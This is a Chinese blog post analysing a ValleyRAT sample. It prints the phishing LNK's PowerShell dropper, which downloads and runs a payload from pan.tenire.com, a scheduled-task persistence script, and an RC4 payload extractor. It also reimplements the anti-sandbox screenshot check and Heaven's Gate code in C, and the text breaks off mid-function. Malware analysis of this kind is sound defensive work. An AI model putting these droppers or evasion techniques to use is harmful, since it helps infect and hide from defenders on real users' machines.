@@ -1,0 +1,581 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#15171a">
+  <meta name="description" content="（1） UAC 绕过方法的三种方法以及代码实现 （2）样本终止与对抗杀软的实现方式 （3）反沙箱实现方式 钓鱼部分 钓鱼方式采用的是使用powershell lnk伪装为个人简介pdf Hash： SHA256:ae857addc8eb51dbfa7d0a76b19dae7a6f275f7bf1042d1c982aca4f80ce635e...">
+  <meta name="author" content="YCr0w">
+  <title>ValleyRAT | YCr0w&#39;blog</title>
+  <link rel="icon" type="image/x-icon" href="/assets/site/favicon.ico">
+  <link rel="stylesheet" href="/assets/css/site.css">
+  <script src="/assets/vendor/lucide.js" defer></script>
+  <script src="/assets/js/site.js" defer></script>
+</head>
+<body class="article-page">
+  <header class="site-header">
+    <div class="header-profile">
+      <a class="header-identity" href="/" aria-label="返回首页"><img class="header-avatar" src="/assets/site/avatar.jpg" alt="YCr0w"><span class="header-name">YCr0w</span></a>
+      <div class="header-links"><a href="https://github.com/YCr0w" target="_blank" rel="noopener" aria-label="GitHub"><i data-lucide="github" aria-hidden="true"></i></a><a href="mailto:3083981460@qq.com" aria-label="Email"><i data-lucide="mail" aria-hidden="true"></i></a></div>
+    </div>
+    <button class="nav-toggle icon-button" type="button" aria-label="打开导航"><i data-lucide="menu" aria-hidden="true"></i></button>
+    <nav class="main-nav" aria-label="主导航">
+      <a href="/"><i data-lucide="house" aria-hidden="true"></i><span>首页</span></a><a href="/categories/"><i data-lucide="folder-tree" aria-hidden="true"></i><span>分类</span></a><a href="/archives/"><i data-lucide="archive" aria-hidden="true"></i><span>归档</span></a><a href="/about/"><i data-lucide="user-round" aria-hidden="true"></i><span>关于</span></a>
+    </nav>
+    <div class="header-actions">
+      <div class="search-inline" id="search-inline">
+        <button class="icon-button" id="search-button" type="button" aria-label="搜索" aria-expanded="false"><i data-lucide="search" aria-hidden="true"></i></button>
+        <input id="search-input" type="search" placeholder="搜索文章、标签或分类" autocomplete="off">
+        <div class="search-results" id="search-results"></div>
+      </div>
+      <button class="icon-button" id="theme-button" type="button" aria-label="切换主题"><i data-lucide="sun-moon" aria-hidden="true"></i></button>
+    </div>
+  </header>
+  <main class="article-shell">
+    <article class="article"><header class="article-header"><a class="article-category" href="/categories/malware-analysis/" style="--category-color:#d84a5b"><span class="category-dot"></span>恶意软件分析</a><h1>ValleyRAT</h1><p>（1） UAC 绕过方法的三种方法以及代码实现 （2）样本终止与对抗杀软的实现方式 （3）反沙箱实现方式 钓鱼部分 钓鱼方式采用的是使用powershell lnk伪装为个人简介pdf Hash： SHA256:ae857addc8eb51dbfa7d0a76b19dae7a6f275f7bf1042d1c982aca4f80ce635e...</p><div class="article-meta"><span><i data-lucide="calendar-days" aria-hidden="true"></i>2026年8月13日</span><span><i data-lucide="clock-3" aria-hidden="true"></i>22 分钟阅读</span></div><div class="tag-list"></div></header><div class="article-body markdown-body"><p>（1） UAC 绕过方法的三种方法以及代码实现</p>
+<p>（2）样本终止与对抗杀软的实现方式</p>
+<p>（3）反沙箱实现方式</p>
+<h3 id="钓鱼部分">钓鱼部分</h3>
+<p>钓鱼方式采用的是使用powershell lnk伪装为个人简介pdf</p>
+<p>Hash：</p>
+<ul>
+<li>SHA256:ae857addc8eb51dbfa7d0a76b19dae7a6f275f7bf1042d1c982aca4f80ce635e</li>
+<li>MD5:f5b9ad341ccfe06352b8818b90b2413e</li>
+<li>SHA1:1b3a15955779e11424698f67bd305e15f6750fca</li>
+</ul>
+<p>查看文件属性可以发现具体的powershell命令</p>
+<p><img src="/assets/posts/valleyrat/images/1770377130857-43b652b0-e0c4-4ac4-82d8-b5418b13b19c.png" alt="ValleyRAT" loading="lazy" decoding="async"></p>
+<blockquote>
+<p>C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe        -NoP -ep Bypass -w h  $localPath = (Get-Location).Path; Remove-Item -Path "$localPath\我的简历.lnk" -Force; $h='ht'; $t='tps'; curl "${h}${t}://pan.tenire.com/down.php/c5932995bbb5708687fb1014ee01d6b9.pdf" -o "$localPath\我的简历.pdf"; Start-Process -FilePath "$localPath\我的简历.pdf"; if (-not (Test-Path "$env:APPDATA\Security")){   New-Item -Type Directory "$env:APPDATA\Security" -Force|Out-Null }; curl "${h}${t}://pan.tenire.com/down.php/83b341a1caab40ad1e7adb9fb4a8b911.zip" -o "$env:APPDATA\Security\pkg.zip"; Expand-Archive -Path "$env:APPDATA\Security\pkg.zip"  -DestinationPath "$env:APPDATA\Security" -Force;  Remove-Item "$env:APPDATA\Security\pkg.zip" -Force; &amp; "$env:APPDATA\Security\keytool.exe"; &amp; "$env:APPDATA\Security\CreateHiddenTask.vbs";</p>
+</blockquote>
+<p>指令解释：</p>
+<p><code>powershell.exe -NoP -ep Bypass -w h</code></p>
+<ul>
+<li><code>-NoP</code>：不加载 PowerShell Profile</li>
+<li><code>-ep Bypass</code>：绕过执行策略</li>
+<li><code>-w h</code>（<code>-WindowStyle Hidden</code>）：窗口隐藏</li>
+</ul>
+<pre><code class="hljs language-c">$localPath = (Get-Location).Path;
+Remove-Item -Path <span class="hljs-string">"$localPath\我的简历.lnk"</span> -Force;
+</code></pre><ul>
+<li>获取<strong>当前工作目录</strong>（通常就是双击快捷方式所在目录）</li>
+<li>删除 <code>我的简历.lnk</code></li>
+</ul>
+<pre><code class="hljs language-c">$h=<span class="hljs-string">'ht'</span>; $t=<span class="hljs-string">'tps'</span>; 
+curl <span class="hljs-string">"${h}${t}://pan.tenire.com/down.php/c5932995bbb5708687fb1014ee01d6b9.pdf"</span> -o <span class="hljs-string">"$localPath\\我的简历.pdf"</span>;
+Start-Process -FilePath <span class="hljs-string">"$localPath\\我的简历.pdf"</span>;
+</code></pre><ul>
+<li>拼出 <code>https</code></li>
+<li>下载一个 PDF 文件立刻打开给用户看</li>
+</ul>
+<pre><code class="hljs language-c"><span class="hljs-keyword">if</span> (-not (Test-Path <span class="hljs-string">"$env:APPDATA\Security"</span>)){
+  New-Item -Type Directory <span class="hljs-string">"$env:APPDATA\Security"</span> -Force
+};
+<span class="hljs-comment">//C:\Users\&lt;User&gt;\AppData\Roaming\Security</span>
+</code></pre><ul>
+<li>在 AppData 下创建隐藏工作目录</li>
+</ul>
+<pre><code class="hljs language-c">curl <span class="hljs-string">"https://pan.tenire.com/down.php/xxxx.zip"</span> -o <span class="hljs-string">"$env:APPDATA\Security\pkg.zip"</span>;
+Expand-Archive -Path <span class="hljs-string">"$env:APPDATA\Security\pkg.zip"</span> -DestinationPath <span class="hljs-string">"$env:APPDATA\Security"</span> -Force;
+Remove-Item <span class="hljs-string">"$env:APPDATA\Security\pkg.zip"</span> -Force;
+</code></pre><ul>
+<li>下载压缩包</li>
+<li>解压到 <code>AppData\Security</code></li>
+<li>删除 zip</li>
+</ul>
+<pre><code class="hljs language-c">&amp; <span class="hljs-string">"$env:APPDATA\Security\keytool.exe"</span>;
+&amp; <span class="hljs-string">"$env:APPDATA\Security\CreateHiddenTask.vbs"</span>;
+</code></pre><ul>
+<li>运行 EXE  </li>
+<li>执行 VBS 脚本</li>
+</ul>
+<p>下载的pkg.zip</p>
+<p><img src="/assets/posts/valleyrat/images/1770380419593-d192864b-1eec-418f-86f0-0b76a7800b19.png" alt="ValleyRAT" loading="lazy" decoding="async"></p>
+<p>根据powershell命令分析可以发现，会自动启动keytool.exe与CreateHiddenTask.vbs</p>
+<h3 id="createhiddentask.vbs">CreateHiddenTask.vbs</h3>
+<p>HASH</p>
+<ul>
+<li>SHA256:190d493255c71f3cebb968c197aeef67c62d597b488c4a0b8cd77751e5999b94</li>
+<li>MD5:6ea9555f1874d13246726579263161e8</li>
+<li>SHA1:9ab44514add105acdb17e298744d6a3124ee490d</li>
+</ul>
+<p>先查看vbs脚本</p>
+<pre><code class="hljs language-c">Set WshShell = CreateObject(<span class="hljs-string">"WScript.Shell"</span>)  
+Set service = CreateObject(<span class="hljs-string">"Schedule.Service"</span>)
+Set fso = CreateObject(<span class="hljs-string">"Scripting.FileSystemObject"</span>)
+
+service.Connect
+
+Set taskDefinition = service.NewTask(<span class="hljs-number">0</span>)
+
+
+Set regInfo = taskDefinition.RegistrationInfo
+regInfo.Author = <span class="hljs-string">"Microsoft Corporation"</span>
+regInfo.Description = <span class="hljs-string">""</span>
+
+<span class="hljs-string">' 设置触发器（每天执行一次，24小时间隔）
+Set trigger = taskDefinition.Triggers.Create(2)  '</span> <span class="hljs-number">2</span> = TASK_TRIGGER_DAILY（每日触发器）
+trigger.StartBoundary = <span class="hljs-string">"2025-8-01T08:01:01"</span>     <span class="hljs-string">' 设置开始时间（例如每天0点）
+trigger.DaysInterval = 1                          '</span> 间隔<span class="hljs-number">1</span>天
+trigger.Enabled = True
+
+<span class="hljs-string">' 设置操作（启动程序）
+Set action = taskDefinition.Actions.Create(0)
+action.Path = WshShell.ExpandEnvironmentStrings("%APPDATA%") &amp; "\Security\keytool.exe"
+
+'</span> 注册任务到根目录
+service.GetFolder(<span class="hljs-string">"\").RegisterTaskDefinition "</span>Security<span class="hljs-string">", taskDefinition, 6, , , 3
+
+If fso.FileExists(WScript.ScriptFullName) Then
+  fso.DeleteFile WScript.ScriptFullName  ' 删除自身
+End If</span>
+</code></pre><p>设置计划任务，实现keytool.exe持久化</p>
+<h3 id="keytool.exe">keytool.exe</h3>
+<p>HASH</p>
+<ul>
+<li>SHA256:367c0bbc72b885e313f6731e98c7e4fa2d95c3cadb76e642a8492f8b12b3d9de</li>
+<li>MD5:e94e7b953e67cc7f080b83d3a1cdcb1f</li>
+<li>SHA1:74add8e181ad365e7e2e16317b61dc19e6a78480</li>
+</ul>
+<p><img src="/assets/posts/valleyrat/images/1770382794873-76e42bda-1488-439a-a3ad-aabc28c798ba.png" alt="ValleyRAT" loading="lazy" decoding="async"></p>
+<p>数字签名过期</p>
+<p><img src="/assets/posts/valleyrat/images/1770381305984-35d8fa34-1f7c-4774-a688-8eaf6dc370ec.png" alt="ValleyRAT" loading="lazy" decoding="async"></p>
+<p>白加黑？这个文件是一个正常的文件，会调用jli.dll</p>
+<h3 id="jli.dll">jli.dll</h3>
+<p>HASH</p>
+<ul>
+<li>SHA256:3f7819debdca5df5a6cd50147b51bceba12c5e0f8a6961b1612777080496dde1</li>
+<li>MD5:3ca440a3f4800090ee691e037a9ce501</li>
+<li>SHA1:3177fe43cdaa6c519d47a9225735e4e503901576</li>
+</ul>
+<p><img src="/assets/posts/valleyrat/images/1770381413309-0db942ba-b9fe-45fa-a293-cfba357fe813.png" alt="ValleyRAT" loading="lazy" decoding="async"></p>
+<p><img src="/assets/posts/valleyrat/images/1770456557298-5706752c-7814-415d-ba47-1e1457138195.png" alt="ValleyRAT" loading="lazy" decoding="async"></p>
+<p>读取keytool.exe，然后在这个可执行文件中查找1C 3B 7E FF，然后读取大小为0xE60</p>
+<p><img src="/assets/posts/valleyrat/images/1770436313450-bd8af377-0243-4137-8404-a6eff97b982a.png" alt="ValleyRAT" loading="lazy" decoding="async"></p>
+<p>在提取到指定数据之后选择使用RC4进行解密，key为：123cba</p>
+<p><img src="/assets/posts/valleyrat/images/1770466571096-ed66ac2a-89b0-4d40-83fd-4efeeff44ef1.png" alt="ValleyRAT" loading="lazy" decoding="async"></p>
+<p>exp：</p>
+<pre><code class="hljs language-c">def <span class="hljs-title function_">rc4_decrypt</span><span class="hljs-params">(key, data)</span>:
+    S = <span class="hljs-built_in">list</span>(range(<span class="hljs-number">256</span>))
+    j = <span class="hljs-number">0</span>
+    <span class="hljs-keyword">for</span> i in range(<span class="hljs-number">256</span>):
+        j = (j + S[i] + key[i % len(key)]) % <span class="hljs-number">256</span>
+        S[i], S[j] = S[j], S[i]
+    
+    i = <span class="hljs-number">0</span>
+    j = <span class="hljs-number">0</span>
+    res = []
+    <span class="hljs-keyword">for</span> byte in data:
+        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>
+        j = (j + S[i]) % <span class="hljs-number">256</span>
+        S[i], S[j] = S[j], S[i]
+        res.append(byte ^ S[(S[i] + S[j]) % <span class="hljs-number">256</span>])
+    
+    <span class="hljs-keyword">return</span> bytes(res)
+
+def main():
+    input_file = <span class="hljs-string">"keytool.exe"</span>       
+    output_file = <span class="hljs-string">"payload_decrypted.bin"</span> 
+    key = b<span class="hljs-string">"123cba"</span>                
+    magic_tag = b<span class="hljs-string">'\x1C\x3B\x7E\xFF\x1C\x3B\x7E\xFF'</span> 
+    payload_size = <span class="hljs-number">0xE60</span>               
+
+    try:
+        with open(input_file, <span class="hljs-string">"rb"</span>) as f:
+            file_data = f.read()
+
+        tag_pos = file_data.find(magic_tag)
+        
+        <span class="hljs-keyword">if</span> tag_pos == <span class="hljs-number">-1</span>:
+            <span class="hljs-keyword">return</span>
+        
+        start_pos = tag_pos + len(magic_tag)
+        encrypted_data = file_data[start_pos : start_pos + payload_size]
+        
+        <span class="hljs-keyword">if</span> len(encrypted_data) &lt; payload_size:
+            print(f<span class="hljs-string">"[!] 警告：提取的数据长度 ({len(encrypted_data)}) 小于指定的 Size ({payload_size})"</span>)
+
+        decrypted_data = rc4_decrypt(key, encrypted_data)
+        
+        with open(output_file, <span class="hljs-string">"wb"</span>) as f:
+            f.write(decrypted_data)
+        
+        print(f<span class="hljs-string">"[+] 解密完成！结果已保存至: {output_file}"</span>)
+
+    except FileNotFoundError:
+        print(f<span class="hljs-string">"[-] 错误：找不到文件 {input_file}"</span>)
+    except Exception as e:
+        print(f<span class="hljs-string">"[-] 发生错误: {e}"</span>)
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
+    main()
+</code></pre><p>解密之后在sub_100015B0中为运行shellcode的逻辑</p>
+<p><img src="/assets/posts/valleyrat/images/1770895188952-12b6428d-5df8-4291-9137-7f5916905572.png" alt="ValleyRAT" loading="lazy" decoding="async"></p>
+<p>sub_10001380取出 WOW32Reserved 字段的值</p>
+<p><img src="/assets/posts/valleyrat/images/1770895231403-e5be9a3a-6117-4a59-b071-6337bb70d4d9.png" alt="ValleyRAT" loading="lazy" decoding="async"></p>
+<p>这里采用了<a href="https://zhuanlan.zhihu.com/p/879865434">天堂之门</a>技术</p>
+<p><img src="/assets/posts/valleyrat/images/1770473113368-ddaddb5e-fb3b-4ee4-8531-d4ac7d45a10b.png" alt="ValleyRAT" loading="lazy" decoding="async"></p>
+<p>EA: 是长跳转的机器码</p>
+<p>33 00: 这是段选择子；在 64 位 Windows 中，0x33 指向 64 位代码段，0x23 指向 32 位代码段</p>
+<h3 id="shellcode">shellcode</h3>
+<p>不用针对天堂之门进行分析，直接对得到的shellcode进行分析即可</p>
+<p><img src="/assets/posts/valleyrat/images/1770881738736-b963c9e3-c28f-460f-94c1-4edd7fa63b64.png" alt="ValleyRAT" loading="lazy" decoding="async"></p>
+<p>遍历整个shellcode寻找2A 5E 26 23 24 5E 26 25</p>
+<p><img src="/assets/posts/valleyrat/images/1770869294196-47c4fb24-40fe-4bf5-b73c-127e47d127a9.png" alt="ValleyRAT" loading="lazy" decoding="async"></p>
+<p>其实通过下面的分析可以知道，这部分类似于config</p>
+<p><img src="/assets/posts/valleyrat/images/1770880549961-a3512565-85d3-436f-9044-004798ab66cd.png" alt="ValleyRAT" loading="lazy" decoding="async"></p>
+<p>sub_13C0D4D采用hash来获取api</p>
+<p><img src="/assets/posts/valleyrat/images/1770824063720-630c53f6-50f0-4eef-99bf-41c147c42baa.png" alt="ValleyRAT" loading="lazy" decoding="async"></p>
+<p><img src="/assets/posts/valleyrat/images/1770480348276-5e858b26-ab6d-4958-9e23-52357dc28810.png" alt="ValleyRAT" loading="lazy" decoding="async"></p>
+<p>动调能拿到所有涉及到的api</p>
+<p>动调可以发现前面部分的判断v70[105]、v70[106]、v70[107]，这三个判断条件都来自于读取的config，而这里的config对应位置为0，故直接跳转到网络部分</p>
+<p><img src="/assets/posts/valleyrat/images/1770880066563-5471d860-7f40-472b-b2c8-aea878aa764a.png" alt="ValleyRAT" loading="lazy" decoding="async"></p>
+<p>sub_13C0A81网络模块</p>
+<p><img src="/assets/posts/valleyrat/images/1770880087065-4aa78b00-da38-4762-9b3b-8d80637ac105.png" alt="ValleyRAT" loading="lazy" decoding="async"></p>
+<p>通过patch config分析其他模块功能</p>
+<h4>UAC</h4>
+<p>GetModuleFileNameA找到样本现在在磁盘的什么位置，调用 ShellExecuteExA，传入 "runas"（这样的提权会出现用户提示弹窗</p>
+<p><img src="/assets/posts/valleyrat/images/1770911930695-6d76392e-c70a-4b59-b0f1-e076767bea5e.png" alt="ValleyRAT" loading="lazy" decoding="async"></p>
+<p><img src="/assets/posts/valleyrat/images/1770911921773-d502880a-b58f-4f5f-b056-8edd411b41af.png" alt="ValleyRAT" loading="lazy" decoding="async"></p>
+<h4>隐藏窗口</h4>
+<p>通过遍历桌面所有窗口，找到属于自己进程的窗口并将其强制隐藏</p>
+<p><img src="/assets/posts/valleyrat/images/1770997304357-a8b4c1bc-b21f-4c7c-98f3-133113d7b276.png" alt="ValleyRAT" loading="lazy" decoding="async"></p>
+<h4>反沙箱</h4>
+<p><img src="/assets/posts/valleyrat/images/1771000173200-940cc784-eb00-4410-a2cb-9adeb10f6a23.png" alt="ValleyRAT" loading="lazy" decoding="async"></p>
+<p>反沙箱，每隔2s截图，然后按字节对比两张图片的像素点，如果变化超过20000点像素则说明不是沙箱 </p>
+<pre><code class="hljs language-c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+
+
+BOOL <span class="hljs-title function_">GetScreenPixels</span><span class="hljs-params">(BYTE* buffer, <span class="hljs-type">int</span> width, <span class="hljs-type">int</span> height)</span> {
+    HDC hScreenDC = GetDC(<span class="hljs-literal">NULL</span>); 
+    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
+    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
+    HGDIOBJ hOldObj = SelectObject(hMemoryDC, hBitmap);
+
+    BitBlt(hMemoryDC, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, width, height, hScreenDC, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, SRCCOPY);
+
+    BITMAPINFO bmi = { <span class="hljs-number">0</span> };
+    bmi.bmiHeader.biSize = <span class="hljs-keyword">sizeof</span>(BITMAPINFOHEADER);
+    bmi.bmiHeader.biWidth = width;
+    bmi.bmiHeader.biHeight = -height; 
+    bmi.bmiHeader.biPlanes = <span class="hljs-number">1</span>;
+    bmi.bmiHeader.biBitCount = <span class="hljs-number">32</span>;   
+    bmi.bmiHeader.biCompression = BI_RGB;
+
+    <span class="hljs-type">int</span> result = GetDIBits(hMemoryDC, hBitmap, <span class="hljs-number">0</span>, height, buffer, &amp;bmi, DIB_RGB_COLORS);
+
+    SelectObject(hMemoryDC, hOldObj);
+    DeleteObject(hBitmap);
+    DeleteDC(hMemoryDC);
+    ReleaseDC(<span class="hljs-literal">NULL</span>, hScreenDC);
+
+    <span class="hljs-keyword">return</span> (result &gt; <span class="hljs-number">0</span>);
+}
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
+    <span class="hljs-type">int</span> width = GetSystemMetrics(SM_CXSCREEN);
+    <span class="hljs-type">int</span> height = GetSystemMetrics(SM_CYSCREEN);
+    <span class="hljs-type">int</span> dataSize = width * height * <span class="hljs-number">4</span>; 
+
+    BYTE* buf1 = (BYTE*)<span class="hljs-built_in">malloc</span>(dataSize);
+    BYTE* buf2 = (BYTE*)<span class="hljs-built_in">malloc</span>(dataSize);
+
+    <span class="hljs-keyword">if</span> (!buf1 || !buf2) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
+
+    GetScreenPixels(buf1, width, height);
+
+    <span class="hljs-type">int</span> maxAttempts = <span class="hljs-number">1800</span>; 
+    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; maxAttempts; i++) {
+        Sleep(<span class="hljs-number">2000</span>);
+        <span class="hljs-keyword">if</span> (GetScreenPixels(buf2, width, height)) {
+            <span class="hljs-type">long</span> diffCount = <span class="hljs-number">0</span>;
+            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; dataSize; j++) {
+                <span class="hljs-keyword">if</span> (buf1[j] != buf2[j]) {
+                    diffCount++;
+                }
+            }
+            <span class="hljs-keyword">if</span> (diffCount &gt; <span class="hljs-number">20000</span>) {
+                <span class="hljs-keyword">break</span>; 
+            } <span class="hljs-keyword">else</span> {
+            }
+        }
+    }
+
+    <span class="hljs-built_in">free</span>(buf1);
+    <span class="hljs-built_in">free</span>(buf2);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre><h3 id="天堂之门">天堂之门</h3>
+<pre><code class="hljs language-c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">memcpy64</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> dst, <span class="hljs-type">uint64_t</span> src, <span class="hljs-type">uint64_t</span> sz)</span>;
+<span class="hljs-type">void</span> <span class="hljs-title function_">GetPEB64</span><span class="hljs-params">(<span class="hljs-type">void</span>* peb64)</span>;
+<span class="hljs-type">uint64_t</span> <span class="hljs-title function_">GetModuleHandle64</span><span class="hljs-params">(<span class="hljs-type">const</span> WCHAR* moduleName)</span>;
+<span class="hljs-type">uint64_t</span> <span class="hljs-title function_">MyGetProcAddress</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> moduleBase, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* funcName)</span>;
+<span class="hljs-type">uint64_t</span> <span class="hljs-title function_">X64Call</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> proc, <span class="hljs-type">uint32_t</span> argc, ...)</span>;
+<span class="hljs-type">uint64_t</span> <span class="hljs-title function_">GetKernel32</span><span class="hljs-params">()</span>;
+<span class="hljs-type">uint64_t</span> <span class="hljs-title function_">GetProcAddress64</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> module, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* func)</span>;
+<span class="hljs-type">uint64_t</span> <span class="hljs-title function_">LoadLibrary64</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* name)</span>;
+
+<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">UNICODE_STRING64</span> {</span>
+    <span class="hljs-type">uint16_t</span> Length;
+    <span class="hljs-type">uint16_t</span> MaximumLength;
+    <span class="hljs-type">uint32_t</span> Pad;
+    <span class="hljs-type">uint64_t</span> Buffer;
+} UNICODE_STRING64;
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">memcpy64</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> dst, <span class="hljs-type">uint64_t</span> src, <span class="hljs-type">uint64_t</span> sz)</span> {
+    <span class="hljs-type">static</span> <span class="hljs-type">uint8_t</span> code[] = {
+        <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xCB</span>,
+        <span class="hljs-number">0x56</span>, <span class="hljs-number">0x57</span>,
+        <span class="hljs-number">0x48</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x11</span>,
+        <span class="hljs-number">0x48</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x11</span>,
+        <span class="hljs-number">0x48</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x11</span>,
+        <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xA4</span>,
+        <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x5F</span>,
+        <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xCB</span>,
+        <span class="hljs-number">0xC3</span>
+        };
+
+    <span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> ptr = <span class="hljs-literal">NULL</span>;
+    <span class="hljs-keyword">if</span> (!ptr) {
+        ptr = (<span class="hljs-type">uint32_t</span>)VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span>(code), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(code); i++) ((PBYTE)ptr)[i] = code[i];
+    }
+    *(<span class="hljs-type">uint32_t</span>*)(ptr + <span class="hljs-number">3</span>) = ptr + <span class="hljs-number">8</span>;
+    *(<span class="hljs-type">uint64_t</span>*)(ptr + <span class="hljs-number">12</span>) = src;
+    *(<span class="hljs-type">uint64_t</span>*)(ptr + <span class="hljs-number">22</span>) = dst;
+    *(<span class="hljs-type">uint64_t</span>*)(ptr + <span class="hljs-number">32</span>) = sz;
+    *(<span class="hljs-type">uint32_t</span>*)(ptr + <span class="hljs-number">47</span>) = ptr + <span class="hljs-number">53</span>;
+    ((<span class="hljs-type">void</span>(*)())ptr)();
+}
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">GetPEB64</span><span class="hljs-params">(<span class="hljs-type">void</span>* peb64)</span> {
+    <span class="hljs-type">static</span> <span class="hljs-type">uint8_t</span> code[] = {
+        <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xCB</span>,
+        <span class="hljs-number">0x65</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x6</span>,
+        <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xCB</span>,
+        <span class="hljs-number">0xC3</span>
+        };
+
+    <span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> ptr = <span class="hljs-literal">NULL</span>;
+    <span class="hljs-keyword">if</span> (!ptr) {
+        ptr = (<span class="hljs-type">uint32_t</span>)VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span>(code), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(code); i++) ((PBYTE)ptr)[i] = code[i];
+    }
+    *(<span class="hljs-type">uint32_t</span>*)(ptr + <span class="hljs-number">1</span>) = (<span class="hljs-type">uint32_t</span>)peb64;
+    *(<span class="hljs-type">uint32_t</span>*)(ptr + <span class="hljs-number">8</span>) = ptr + <span class="hljs-number">13</span>;
+    *(<span class="hljs-type">uint32_t</span>*)(ptr + <span class="hljs-number">31</span>) = ptr + <span class="hljs-number">37</span>;
+    ((<span class="hljs-type">void</span>(*)())ptr)();
+}
+
+<span class="hljs-type">uint64_t</span> <span class="hljs-title function_">X64Call</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> proc, <span class="hljs-type">uint32_t</span> argc, ...)</span> {
+    <span class="hljs-type">uint64_t</span>* args = (<span class="hljs-type">uint64_t</span>*)(&amp;argc + <span class="hljs-number">1</span>);
